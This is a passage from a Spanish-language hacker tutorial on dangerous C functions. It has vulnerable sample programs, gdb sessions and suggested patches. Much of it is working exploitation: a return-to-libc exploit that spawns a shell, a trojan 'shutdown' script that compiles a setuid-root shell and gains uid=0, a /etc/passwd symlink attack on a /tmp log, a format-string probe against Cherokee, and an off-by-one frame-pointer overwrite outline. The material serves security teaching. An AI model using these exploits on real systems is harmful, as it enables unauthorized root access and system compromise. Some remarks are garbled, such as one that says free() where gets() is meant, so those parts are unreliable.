+0xbffff751: 0x41414141 0x41414141 0x60004141 0x00080483<br>
+0xbffff761: 0x40000000 0x5c4000a4 0xf84013b4 0x0340015f<br>
+0xbffff771: 0x60000000 0x00080483<br>
+(gdb)<br></code>
+<br>
+Como Parcheariamos?<br>
+Si estamos en *BSD con strlcpy<br>
+strncat(vuln, argv[1], sizeof(vuln));<br>
+strncat(str, argv[2], sizeof(str));<br>
+-<br>
+strlcat(vuln, argv[1], sizeof(vuln));<br>
+strlcat(str, argv[2], sizeof(str));<br>
+<br>
+otra manera seria haciendo algo como<br>
+<code><br>
+if(strlen(argv[1]) &gt; sizeof(buffer))<br>
+{<br>
+printf(&quot;\nArgument is TOO LONG!\n\n&quot;);<br>
+exit(0);<br>
+}<br></code>
+Pues yo utilizo esta a la hora de codear algo.<br>
+==================================================================================================<br>
+==================================================================================================<br>
+H• strcmp — Compara cadenas<br>
+int strcmp(const char *s1, const char *s2);<br>
+I• strncmp — Compara cadenas , caracter NULL no se tiene en cuenta<br>
+int strncmp(const char *s1, const char *s2, size_t n);<br>
+<br><code>
+#include &lt;string.h&gt;<br>
+#include &lt;stdlib.h&gt;<br>
+<br>
+int main(int argc, char *argv[])<br>
+{<br>
+char buf[10];<br>
+strcmp (buf, argv[1]); //OverFlow<br>
+}<br></code>
+Fix:<br><code>
+<br>
+#include &lt;string.h&gt;<br>
+#include &lt;stdlib.h&gt;<br>
+<br>
+int main(int argc, char *argv[])<br>
+{<br>
+char buf[10];<br>
+strncmp (buf, argv[1], sizeof(buf));<br>
+}<br></code>
+##################################################################################################<br>
+5. <b>•fopen — Abre archivos con modo</b>.<br>
+Sintaxis: FILE *fopen(const char *nombre, const char *modo);<br>
+Ejemplo: fopen(nombre,&quot;w&quot;);<br>
+Bueno no tengo mucho que decir de esta funcion pero eso si, trata de dejar tus 
+uid=0 files<br>
+con los permisos apropiados por que si algun programa en especial llega a tener 
+una sintaxis como<code><br>
+if ((fd = fopen (config_fname, &quot;r&quot;)) == NULL) // Abrimos cual quiere 
+archivo!!!!!!<br>
+{<br>
+perror (&quot;fopen&quot;);<br>
+return (-1);<br>
+}<br></code>
+Imaginate que puedan leer tu /etc/shadow?<br>
+Un simple ejemplo seria<br>
+// File log.c<br>
+<code><br>
+#ifdef LOGFILE<br>
+if((fp = fopen(&quot;/tmp/ssmtp.log&quot;, &quot;a&quot;)) != (FILE *)NULL) {<br>
+(void)fprintf(fp, &quot;%s\n&quot;, buf);<br>
+(void)fclose(fp);<br>
+}<br>
+else {<br>
+(void)fprintf(stderr, &quot;Can't write to /tmp/ssmtp.log\n&quot;);<br>
+}<br>
+#endif<br></code>
+<br>
+Se puede hacer un linkeaje a passwd<br>
+ln -s /etc/passwd /tmp/ssmtp.log<br>
+<br>
+##################################################################################################<br>
+6. <b>•gets &amp; fgets — Lee caractares desde el stream ((muy peligroso))</b><br>
+Sintaxis: char *gets(char *cadena);<br>
+char *fgets(char *cadena, int n, FILE *stream);<br>
+Ejemplo: gets(cadena);<br>
+fgets(linea, 81, fichero)<br>
+//gets.c<code><br>
+root@NeoSecurity:/home/hackzatan# cat gets.c<br>
+int main(int argc, char **argv)<br>
+{<br>
+char buf[10];<br>
+gets(buf);<br>
+}<br>
+root@NeoSecurity:/home/hackzatan# gcc gets.c -o gets<br>
+/tmp/cc8OVlab.o(.text+0x24): In function `main':<br>
+: warning: the `gets' function is dangerous and should not be used.<br>
+root@NeoSecurity:/home/hackzatan# ./gets<br>
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br>
+Segmentation fault<br>
+root@NeoSecurity:/home/hackzatan# gdb ./gets<br>
+GNU gdb 6.3<br>
+Copyright 2004 Free Software Foundation, Inc.<br>
+GDB is free software, covered by the GNU General Public License, and you are<br>
+welcome to change it and/or distribute copies of it under certain conditions.<br>
+Type &quot;show copying&quot; to see the conditions.<br>
+There is absolutely no warranty for GDB. Type &quot;show warranty&quot; for details.<br>
+This GDB was configured as &quot;i486-slackware-linux&quot;...Using host libthread_db 
+library &quot;/lib/libthread_db.so.1&quot;.<br>
+<br>
+(gdb) r<br>
+Starting program: /home/hackzatan/gets<br>
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br>
+<br>
+Program received signal SIGSEGV, Segmentation fault.<br>
+0x61616161 in ?? ()<br>
+(gdb) i r<br>
+eax 0xbffff800 -1073743872<br>
+ecx 0xfbad2288 -72539512<br>
+edx 0x0 0<br>
+ebx 0x40138ff4 1075023860<br>
+esp 0xbffff820 0xbffff820<br>
+ebp 0x61616161 0x61616161<br>
+esi 0xbffff87c -1073743748<br>
+edi 0x1 1<br>
+eip 0x61616161 0x61616161<br>
+eflags 0x10286 66182<br>
+cs 0x73 115<br>
+ss 0x7b 123<br>
+ds 0x7b 123<br>
+es 0x7b 123<br>
+fs 0x0 0<br>
+gs 0x0 0<br>
+(gdb)bt<br>
+#0 0x61616161 in ?? ()<br>
+#1 0x61616161 in ?? ()<br>
+#2 0x61616161 in ?? ()<br>
+#3 0x61616161 in ?? ()<br>
+#4 0x61616161 in ?? ()<br>
+#5 0x61616161 in ?? ()<br>
+#6 0x61616161 in ?? ()<br>
+#7 0x61616161 in ?? ()<br>
+#8 0x61616161 in ?? ()<br>
+#9 0x61616161 in ?? ()<br>
+#10 0x61616161 in ?? ()<br>
+#11 0x61616161 in ?? ()<br>
+#12 0x61616161 in ?? ()<br>
+#13 0x61616161 in ?? ()<br>
+#14 0x61616161 in ?? ()<br>
+#15 0x61616161 in ?? ()<br>
+#16 0x61616161 in ?? ()<br>
+#17 0x61616161 in ?? ()<br>
+#18 0x61616161 in ?? ()<br>
+foo-bar<br></code>
+<br>
+Como parcheariamos?<br>
+Pues muy simple no usen free() como lo dice el compilador<br>
+: warning: the `gets' function is dangerous and should not be used.<br>
+Utiliza fgets es mas seguro pero sigue vulnerable si no lo sabes usar<br>
+si el buf es de 10 no coloques los 10 coloca 9 <br>
+<br>
+##################################################################################################<br>
+7. <b>•getenv — Busca lista de entornos &quot;Enviroment&quot;</b><br>
+Sintaxis: char *getenv(const char *nombre);<br>
+Ejemplo: getenv(&quot;PATH&quot;);<br>
+//getenv.c<code><br>
+root@NeoSecurity:/home/hackzatan# cat getenv.c<br>
+#include &lt;string.h&gt;<br>
+#include &lt;stdlib.h&gt;<br>
+#include &lt;stdio.h&gt;<br>
+<br>
+int main(int ac, char **av)<br>
+{<br>
+char cmd[500];<br>
+int len;<br>
+int i;<br>
+<br>
+memset (cmd, '\0', 500);<br>
+len = strlen(av[1]);<br>
+for (i = 0; i &lt;= 500 - len; i++)<br>
+cmd[i] = ' ';<br>
+strcat(cmd, av[1]);<br>
+setenv(&quot;RCL&quot;, cmd, 1);<br>
+system(&quot;/bin/sh&quot;);<br>
+return 42;<br>
+}<br>
+<br>
+root@NeoSecurity:/home/hackzatan# gcc getenv.c -o getenv<br>
+root@NeoSecurity:/home/hackzatan# ./getenv /bin/sh<br>
+sh-3.00# export<br>
+foo bar<br>
+export RCL=&quot; /bin/sh&quot;<br>
+export SHELL=&quot;/bin/bash&quot;<br>
+export SHLVL=&quot;3&quot;<br>
+export T1LIB_CONFIG=&quot;/usr/share/t1lib/t1lib.config&quot;<br>
+export TERM=&quot;xterm&quot;<br>
+export USER=&quot;root&quot;<br>
+export _=&quot;/bin/sh&quot;<br>
+sh-3.00# exit<br>
+exit<br>
+root@NeoSecurity:/home/hackzatan# gdb ./getenv<br>
+GNU gdb 6.3<br>
+Copyright 2004 Free Software Foundation, Inc.<br>
+GDB is free software, covered by the GNU General Public License, and you are<br>
+welcome to change it and/or distribute copies of it under certain conditions.<br>
+Type &quot;show copying&quot; to see the conditions.<br>
+There is absolutely no warranty for GDB. Type &quot;show warranty&quot; for details.<br>
+This GDB was configured as &quot;i486-slackware-linux&quot;...Using host libthread_db 
+library &quot;/lib/libthread_db.so.1&quot;.<br>
+<br>
+(gdb) break main<br>
+Breakpoint 1 at 0x804846d<br>
+(gdb) r<br>
+Starting program: /home/hackzatan/getenv<br>
+<br>
+Breakpoint 1, 0x0804846d in main ()<br>
+(gdb) p system<br>
+$1 = {&lt;text variable, no debug info&gt;} 0x40055200 &lt;system&gt;<br>
+(gdb) x/200x $esp<br>
+foo-bar<br>
+0xbfffd600: 0x6e616d2f 0x73752f3a 0x616d2f72 0x752f3a6e<br>
+0xbfffd610: 0x582f7273 0x36523131 0x6e616d2f 0x73752f3a<br>
+0xbfffd620: 0x696c2f72 0x616a2f62 0x6d2f6176 0x2f3a6e61<br>
+0xbfffd630: 0x2f727375 0x72616873 0x65742f65 0x2f666d78<br>
+0xbfffd640: 0x006e616d 0x313d5a48 0x48003030 0x4e54534f<br>
+0xbfffd650: 0x3d454d41 0x536f654e 0x72756365 0x2e797469<br>
+0xbfffd660: 0x536f654e 0x72756365 0x00797469 0x4b434148<br>
+0xbfffd670: 0x4141413d 0x41414141 0x41414141 0x41414141<br>
+0xbfffd680: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbfffd690: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbfffd6a0: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbfffd6b0: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbfffd6c0: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbfffd6d0: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbfffd6e0: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbfffd6f0: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbfffd700: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbfffd710: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbfffd720: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbfffd730: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbfffd740: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+0xbfffd750: 0x41414141 0x41414141 0x41414141 0x41414141<br>
+<br>
+Cojamos una direccion de '\x41'<br>
+Ahora explotamos!!!<br>
+root@NeoSecurity:/home/hackzatan# cat x.c<br>
+/* Lame Ass Exploit By NST */<br>
+int main()<br>
+{<br>
+//OverFlow<br>
+printf(&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;);<br>
+/* (gdb) p system<br>
+$1 = {&lt;text variable, no debug info&gt;} 0x40055200 &lt;system&gt; */<br>
+printf(&quot;\\x00\\x34\\x05\\x40&quot;);<br>
+//Colocamos Cualquier ReT Address<br>
+printf(&quot;NST_&quot;);<br>
+//La direccion que escojimos en mi caso 0xbfffd6c0<br>
+printf(&quot;\\xc0\\xd6\\xff\\xbf&quot;);<br>
+}<br>
+root@NeoSecurity:/home/hackzatan# gcc x.c -o x<br>
+root@NeoSecurity:/home/hackzatan# ./getenv `./x`<br>
+sh-3.00# echo Que linda Shell<br>
+Que linda Shell<br>
+sh-3.00#<br></code>
+<br>
+Como parchearimos?<br>
+Siempre mirar el size de getenv(&quot;HOME&quot;); antes de copiarlo<br>
+<br>
+##################################################################################################
+<br>
+8. <b>*scanf Family.</b><br>
+A• scanf — Lee datos de stdin<br>
+<br>
+==================================================================================================<br>
+==================================================================================================<br>
+A• scanf — Lee datos de stdin<br>
+Sintaxis: int scanf(const char *formato, ...);<br>
+Ejemplo: scanf(&quot;%s&quot;,string);<br>
+//scanf.c<code><br>
+root@NeoSecurity:/home/hackzatan# cat scanf.c<br>
+int main(int argc, char **argv[])<br>
+{<br>
+char buf[10];<br>
+scanf(&quot;%s&quot;, &amp;buf);<br>
+}<br>
+root@NeoSecurity:/home/hackzatan# gcc scanf.c -o scanf<br>
+root@NeoSecurity:/home/hackzatan# ./scanf<br>
+HaCkZaTaN<br>
+root@NeoSecurity:/home/hackzatan# ./scanf<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+Segmentation fault<br>
+root@NeoSecurity:/home/hackzatan# gdb ./scanf<br>
+GNU gdb 6.3<br>
+Copyright 2004 Free Software Foundation, Inc.<br>
+GDB is free software, covered by the GNU General Public License, and you are<br>
+welcome to change it and/or distribute copies of it under certain conditions.<br>
+Type &quot;show copying&quot; to see the conditions.<br>
+There is absolutely no warranty for GDB. Type &quot;show warranty&quot; for details.<br>
+This GDB was configured as &quot;i486-slackware-linux&quot;...Using host libthread_db 
+library &quot;/lib/libthread_db.so.1&quot;.<br>
+<br>
+(gdb) r<br>
+Starting program: /home/hackzatan/scanf<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+<br>
+Program received signal SIGSEGV, Segmentation fault.<br>
+0x41414141 in ?? ()<br>
+(gdb) i r<br>
+eax 0x1 1<br>
+ecx 0x401396e0 1075025632<br>
+edx 0x1 1<br>
+ebx 0x40138ff4 1075023860<br>
+esp 0xbfffd470 0xbfffd470<br>
+ebp 0x41414141 0x41414141<br>
+esi 0xbfffd4cc -1073752884<br>
+edi 0x1 1<br>
+eip 0x41414141 0x41414141<br>
+eflags 0x10282 66178<br>
+cs 0x73 115<br>
+ss 0x7b 123<br>
+ds 0x7b 123<br>
+es 0x7b 123<br>
+fs 0x0 0<br>
+gs 0x0 0<br>
+(gdb) bt<br>
+#0 0x41414141 in ?? ()<br>
+#1 0x41414141 in ?? ()<br>
+#2 0x41414141 in ?? ()<br>
+#3 0x41414141 in ?? ()<br>
+#4 0x41414141 in ?? ()<br>
+#5 0x00004141 in ?? ()<br>
+#6 0x4000a440 in _dl_runtime_resolve () from /lib/ld-linux.so.2<br>
+#7 0x080482e1 in _start () at ../sysdeps/i386/elf/start.S:119<br>
+#8 0x08048384 in frame_dummy ()<br>
+Previous frame inner to this frame (corrupt stack?)<br>
+(gdb)<br></code>
+<br>
+Como parcheariamos?<br>
+scanf(&quot;%9s&quot;, &amp;Mis10ByteBuffer);<br>
+Tienes que definir los bytes que quieres qe scanf lea<br>
+No puedes utilizar los mismos por que osino no estas haciendo nada productivo<br>
+Esto se le da el nombre de 'Off-by-one errors'<br>
+Unos diran que utilize sscanf.<br>
+<code><br>
+int main(int argc, char **argv)<br>
+{<br>
+char buf[256];<br>
+sscanf(argv[0], &quot;%s&quot;, &amp;buf); //BUF<br>
+}<br></code>
+<br>
+Patch:<code><br>
+int main(int argc, char **argv)<br>
+{<br>
+char buf[256];<br>
+sscanf(argv[0], &quot;%255s&quot;, &amp;buf); //No BUF =) \=<br>
+}<br></code>
+<br>
+##################################################################################################
+<br>
+9. <b>•syslog. — Envia mensaje a una implementacion de LOG</b><br>
+Syntaxis: void syslog(int priority, const char *message, ... /* arguments */);<br>
+Ejemplo: Syslog(LOG_INFO, line_buff);<br>
+<br>
+Ejemplo Sencillo:<br>
+#include &lt;syslog.h&gt;<br>
+char *message = &quot;HaCkZaTaN&quot;;<br>
+int priority = LOG_ERR | LOG_USER;<br>
+foobar<br>
+syslog(priority, message); //&lt;&lt; BUG<br>
+-=-=-=-=<br>
+http://www.nosystem.com.ar/advisories/advisory-03.txt<br>
+--- common.c ---<code><br>
+55: void <br>
+56: PRINT_ERROR (const char *format, ...)<br>
+57: {<br>
+58: va_list arg_list;<br>
+59: CHEROKEE_TEMP(tmp, 2048); <br>
+60: <br>
+61: va_start(arg_list, format);<br>
+62: vsnprintf (tmp, tmp_size, format, arg_list);<br>
+63: va_end(arg_list);<br>
+64: <br>
+65: fprintf (stderr, &quot;%s&quot;, tmp);<br>
+66: syslog (LOG_ERR, tmp); // &lt;&lt; El bug &lt;&lt; Format String Bug<br>
+67: } <br></code>
+--- common.c ---<br>
+<br>
+root@NeoSecurity:/home/hackzatan# cherokee -C BBBB%08x<br>
+Can't read the configuration file: 'AAAA%08x'<br>
+root@NeoSecurity:/home/hackzatan# cat /var/log/syslog | grep BBBB<br>
+Wed Jan 14 11:25:29 server cherokee: Can't read the configuration file: 
+'BBBB0804b780'<br>
+root@NeoSecurity:/home/hackzatan# <br>
+<br>
+Como parcheamos?<br>
+syslog (LOG_ERR, tmp);<br>
+syslog (LOG_ERR, &quot;%s&quot;, tmp);<br>
+<br>
+##################################################################################################<br>
+10. <b>•system. — Ejecuta comandos de tu PC</b><br>
+Sintaxis: system(&quot;Command&quot;);<br>
+Ejemplo: system(&quot;command&quot;);<br>
+//system.c<code><br>
+root@NeoSecurity:/home/hackzatan# cat system.c<br>
+int main()<br>
+{<br>
+char command[50];<br>
+<br>
+sprintf(command, &quot;shutdown&quot;); // --&gt; Put the shell command in command varible.<br>
+system(command); // --&gt; Execute Command!<br>
+}<br>
+root@NeoSecurity:/home/hackzatan# gcc system.c -o system<br>
+root@NeoSecurity:/home/hackzatan# ./system<br>
+root@NeoSecurity:/home/hackzatan# shutdown<br>
+Usage: shutdown [-akrhfnc] [-t secs] time [warning message]<br>
+-a: use /etc/shutdown.allow<br>
+-k: don't really shutdown, only warn.<br>
+-r: reboot after shutdown.<br>
+-h: halt after shutdown.<br>
+-f: do a 'fast' reboot (skip fsck).<br>
+-F: Force fsck on reboot.<br>
+-n: do not go through &quot;init&quot; but go down real fast.<br>
+-c: cancel a running shutdown.<br>
+-t secs: delay between warning and kill signal.<br>
+** the &quot;time&quot; argument is mandatory! (try &quot;now&quot;) **<br>
+root@NeoSecurity:/home/hackzatan# pico /tmp/shutdown<br>
+root@NeoSecurity:/home/hackzatan# cat /tmp/shutdown<br>
+#!/bin/sh<br>
+cd /tmp<br>
+/bin/cat &gt; shell.c &lt;&lt; EOF<br>
+#include &lt;stdio.h&gt;<br>
+#include &lt;unistd.h&gt;<br>
+int main()<br>
+{<br>
+setuid(0);<br>
+setgid(0);<br>
+execl(&quot;/bin/sh&quot;, &quot;sh&quot;, 0);<br>
+return 0;<br>
+}<br>
+<br>
+EOF<br>
+/usr/bin/gcc /tmp/shell.c -o /tmp/shell<br>
+/bin/chown root.root shell<br>
+/bin/chmod 4755 shell<br>
+/tmp/shell<br>
+root@NeoSecurity:/home/hackzatan# ./system<br>
+Usage: shutdown [-akrhfnc] [-t secs] time [warning message]<br>
+-a: use /etc/shutdown.allow<br>
+-k: don't really shutdown, only warn.<br>
+-r: reboot after shutdown.<br>
+-h: halt after shutdown.<br>
+-f: do a 'fast' reboot (skip fsck).<br>
+-F: Force fsck on reboot.<br>
+-n: do not go through &quot;init&quot; but go down real fast.<br>
+-c: cancel a running shutdown.<br>
+-t secs: delay between warning and kill signal.<br>
+** the &quot;time&quot; argument is mandatory! (try &quot;now&quot;) **<br>
+root@NeoSecurity:/home/hackzatan# /tmp/shutdown<br>
+-su: /tmp/shutdown: Permission denied<br>
+root@NeoSecurity:/home/hackzatan# chmod 777 /tmp/shutdown<br>
+root@NeoSecurity:/home/hackzatan# /tmp/shutdown<br>
+sh-3.00# exit<br>
+exit<br>
+root@NeoSecurity:/home/hackzatan# su hackzatan<br>
+hackzatan@NeoSecurity:~$ /tmp/kshutdown<br>
+/tmp/shutdown: line 3: shell.c: Permission denied<br>
+/usr/lib/gcc/i486-slackware-linux/3.4.3/../../../../i486-slackware-linux/bin/ld: 
+cannot open output file /tmp/shell: Permission denied<br>
+collect2: ld returned 1 exit status<br>
+/bin/chmod: changing permissions of `shell': Operation not permitted<br>
+sh-3.00# id<br>
+uid=0(root) gid=0(root) groups=100(users)<br>
+sh-3.00# exit<br>
+exit<br>
+hackzatan@NeoSecurity:~$ exit<br>
+exit<br>
+root@NeoSecurity:/home/hackzatan#<br></code>
+<br>
+##################################################################################################<br>
+11. <b>•OffOne. — One Byte Frame Pointer OverWrite Hardcoded Exploits</b><br>
+<code><br>
+root@NeoSecurity:/home/hackzatan# cat OffOne.c<br>
+#include &lt;stdio.h&gt;<br>
+<br>
+void OffOne(char *String)<br>
+{<br>
+char Buf[8];<br>
+int i;<br>
+for(i=0;i&lt;=8;i++)<br>
+Buf[i]=String[i];<br>
+}<br>
+<br>
+int main(int argc,char **argv)<br>
+{<br>
+OffOne(argv[1]);<br>
+}<br>
+root@NeoSecurity:/home/hackzatan# gcc OffOne.c -o OffOne<br>
+root@NeoSecurity:/home/hackzatan# gdb ./OffOne<br>
+GNU gdb 6.3<br>
+Copyright 2004 Free Software Foundation, Inc.<br>
+GDB is free software, covered by the GNU General Public License, and you are<br>
+welcome to change it and/or distribute copies of it under certain conditions.<br>
+Type &quot;show copying&quot; to see the conditions.<br>
+There is absolutely no warranty for GDB. Type &quot;show warranty&quot; for details.<br>
+This GDB was configured as &quot;i486-slackware-linux&quot;...Using host libthread_db 
+library &quot;/lib/libthread_db.so.1&quot;.<br>
+<br>
+(gdb) disas OffOne<br>
+Dump of assembler code for function OffOne:<br>
+0x08048354 &lt;OffOne+0&gt;: push %ebp<br>
+0x08048355 &lt;OffOne+1&gt;: mov %esp,%ebp<br>
+0x08048357 &lt;OffOne+3&gt;: sub $0x10,%esp<br>
+0x0804835a &lt;OffOne+6&gt;: movl $0x0,0xfffffff4(%ebp)<br>
+0x08048361 &lt;OffOne+13&gt;: cmpl $0x8,0xfffffff4(%ebp)<br>
+0x08048365 &lt;OffOne+17&gt;: jg 0x8048380 &lt;OffOne+44&gt;<br>
+0x08048367 &lt;OffOne+19&gt;: lea 0xfffffff8(%ebp),%eax<br>
+0x0804836a &lt;OffOne+22&gt;: mov %eax,%edx<br>
+0x0804836c &lt;OffOne+24&gt;: add 0xfffffff4(%ebp),%edx<br>
+0x0804836f &lt;OffOne+27&gt;: mov 0xfffffff4(%ebp),%eax<br>
+0x08048372 &lt;OffOne+30&gt;: add 0x8(%ebp),%eax<br>
+0x08048375 &lt;OffOne+33&gt;: mov (%eax),%al<br>
+0x08048377 &lt;OffOne+35&gt;: mov %al,(%edx)<br>
+0x08048379 &lt;OffOne+37&gt;: lea 0xfffffff4(%ebp),%eax<br>
+0x0804837c &lt;OffOne+40&gt;: incl (%eax)<br>
+0x0804837e &lt;OffOne+42&gt;: jmp 0x8048361 &lt;OffOne+13&gt;<br>
+0x08048380 &lt;OffOne+44&gt;: leave<br>
+0x08048381 &lt;OffOne+45&gt;: ret<br>
+End of assembler dump.<br>
+(gdb) disas main<br>
+Dump of assembler code for function main:<br>
+0x08048382 &lt;main+0&gt;: push %ebp<br>
+0x08048383 &lt;main+1&gt;: mov %esp,%ebp<br>
+0x08048385 &lt;main+3&gt;: sub $0x8,%esp<br>
+0x08048388 &lt;main+6&gt;: and $0xfffffff0,%esp<br>
+0x0804838b &lt;main+9&gt;: mov $0x0,%eax<br>
+0x08048390 &lt;main+14&gt;: add $0xf,%eax<br>
+0x08048393 &lt;main+17&gt;: add $0xf,%eax<br>
+0x08048396 &lt;main+20&gt;: shr $0x4,%eax<br>
+0x08048399 &lt;main+23&gt;: shl $0x4,%eax<br>
+0x0804839c &lt;main+26&gt;: sub %eax,%esp<br>
+0x0804839e &lt;main+28&gt;: mov 0xc(%ebp),%eax<br>
+0x080483a1 &lt;main+31&gt;: add $0x4,%eax<br>
+0x080483a4 &lt;main+34&gt;: pushl (%eax)<br>
+0x080483a6 &lt;main+36&gt;: call 0x8048354 &lt;OffOne&gt;<br>
+0x080483ab &lt;main+41&gt;: add $0x4,%esp<br>
+0x080483ae &lt;main+44&gt;: leave<br>
+0x080483af &lt;main+45&gt;: ret<br>
+End of assembler dump.<br>
+(gdb) break *0x08048381<br>
+Breakpoint 1 at 0x8048381<br>
+(gdb) break *0x080483af<br>
+Breakpoint 2 at 0x80483af<br>
+(gdb) r
+
+Breakpoint 1, 0x08048381 in OffOne ()<br>
+(gdb) i r<br>
+eax 0xbffff5f8 -1073744392<br>
+ecx 0x80494c8 134517960<br>
+edx 0xbffff604 -1073744380<br>
+ebx 0x40138ff4 1075023860<br>
+esp 0xbffff608 0xbffff608<br>
+ebp 0xbffff641 0xbffff641<br>
+esi 0xbffff690 -1073744240<br>
+edi 0x2 2<br>
+eip 0x8048381 0x8048381<br>
+eflags 0x202 514<br>
+cs 0x73 115<br>
+ss 0x7b 123<br>
+ds 0x7b 123<br>
+es 0x7b 123<br>
+fs 0x0 0<br>
+gs 0x0 0<br>
+(gdb) bt<br>
+#95 0x41414141 in ?? ()<br>
+#96 0x41414141 in ?? ()<br>
+#97 0x41414141 in ?? ()<br>
+#98 0x41414141 in ?? ()<br>
+#99 0x41414141 in ?? ()<br>
+#100 0x41414141 in ?? ()<br>
+#101 0x41414141 in ?? ()<br>
+#102 0x41414141 in ?? ()<br>
+#103 0x41414141 in ?? ()<br>
+#104 0x41414141 in ?? ()<br>
+#105 0x41414141 in ?? ()<br>
+#106 0x41414141 in ?? ()<br>
+#107 0x41414141 in ?? ()<br>
+#108 0x41414141 in ?? ()<br>
+#109 0x41414141 in ?? ()<br>
+#110 0x41414141 in ?? ()<br>
+#111 0x41414141 in ?? ()<br>
+#112 0x41414141 in ?? ()<br>
+#113 0x41414141 in ?? ()<br>
+<br></code>
+Forma de explotacion<br>
+[EIP Guardada]<br>
+[EBP Alterada]<br>
+[la direccion de la shellcode (ESP)]<br>
+[JUMP a la Shellcode]<br>
+##################################################################################################<br>
+12. <b>•Despedida.</b><br>
+NST Staff<br>
+LINUX<br>
+erg0t<br>
+uyx<br>
+CrashCool<br>
+Makoki<br>
+KingMetal<br>
+r3v3ng4ns<br>
+<br>
+And my Colombian people<br>
+<br>
+<br>
+##################################################################################################<br>
+13. •Contacto.<br>
+<br>
+HaCkZaTaN - hck_zatan@hotmail.com<br>
+http://NeoSecurityTeam.Net/<br>
+Irc.gigachat.net #NST</font></p>
+
+
+<p><i><b><font size="1" face="Verdana">/* EOF */</font></b></i></p>
+
+
+
+</html>
